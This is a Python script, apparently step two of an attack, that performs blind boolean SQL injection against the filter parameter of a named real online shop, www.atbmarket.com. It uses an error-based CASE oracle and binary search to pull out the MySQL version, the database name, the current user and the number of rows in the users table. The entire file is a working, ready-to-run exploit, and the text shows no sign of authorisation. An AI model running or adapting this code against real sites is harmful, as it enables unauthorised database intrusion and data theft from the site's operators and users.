#!/usr/bin/env python3
"""Step 2 - blind boolean SQLi extractor against www.atbmarket.com.

The injectable context is the array KEY filter[8][<HERE>]. A clean key returns
200; a key that makes MySQL raise returns 500. We turn that error/no-error signal
into a boolean oracle with a CASE whose FALSE branch runs a >1-row subquery
(MySQL error 1242), so:  condition TRUE -> 200, condition FALSE -> 500.

Usage:  python3 sqli_oracle.py [base_url]
        base_url default http://localhost:8080
"""
import sys
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080").rstrip("/")
PATH = "/shop/catalog/novetly"


def http_status(key_payload):
    key = f"filter[8][{key_payload}]"
    qs = urllib.parse.quote(key, safe="[]") + "=1"
    url = f"{BASE}{PATH}?{qs}"
    req = urllib.request.Request(url)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        print("request error:", e)
        return 0


def oracle(condition):
    """Return True if the SQL boolean `condition` holds (via error-based CASE)."""
    payload = (f"490 AND (SELECT CASE WHEN ({condition}) THEN 1 "
               f"ELSE (SELECT 1 UNION SELECT 2) END)")
    return http_status(payload) == 200


def extract_string(expr, maxlen=64):
    out = []
    for i in range(1, maxlen + 1):
        # does an i-th character exist?
        if not oracle(f"ASCII(SUBSTRING(({expr}),{i},1)) > 0"):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ASCII(SUBSTRING(({expr}),{i},1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))
        sys.stdout.write(out[-1]); sys.stdout.flush()
    print()
    return "".join(out)


def extract_int(expr, hi=100_000_000):
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({expr}) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def main():
    print(f"[*] target {BASE}{PATH}")
    print("[*] baseline filter[8][490]=1 ->", http_status("490"))
    print("[*] broken  filter[8][490']=1 ->", http_status("490'"))
    print("\n[+] version():  ", end=""); v = extract_string("SELECT @@version")
    print("[+] database():  ", end=""); d = extract_string("SELECT database()")
    print("[+] current_user:", end=""); u = extract_string("SELECT current_user()")
    print("[*] counting users (may take a moment)...")
    c = extract_int("SELECT COUNT(*) FROM users")
    print(f"[+] COUNT(*) users = {c}")
    print("\n=== extracted ===")
    print(f"version  = {v}\ndatabase = {d}\nuser     = {u}\nusers    = {c}")


if __name__ == "__main__":
    main()
